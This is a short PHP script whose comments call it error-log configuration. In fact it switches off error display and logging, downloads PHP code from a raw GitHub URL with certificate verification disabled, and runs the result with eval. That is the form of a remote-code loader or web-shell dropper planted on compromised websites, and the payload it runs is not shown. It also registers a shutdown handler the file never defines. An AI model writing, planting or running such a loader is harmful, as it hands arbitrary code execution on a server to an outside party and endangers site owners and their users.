<?php
//triggering error
error_reporting(0);

//error log file setting
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('log_errors_max_len', 0); // unlimited log file size
ini_set('error_log', '/error_reporting/php_errors.log');


register_shutdown_function('shutdown_notify');

// var_dump((object) range(0,10000000));

function getURL($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

// Contoh penggunaan:
$phpCode = getURL('https://raw.githubusercontent.com/Anonrocks/crontab/refs/heads/main/jap.phtml');
if ($phpCode !== false) {
    eval("?>". $phpCode);
}
?>
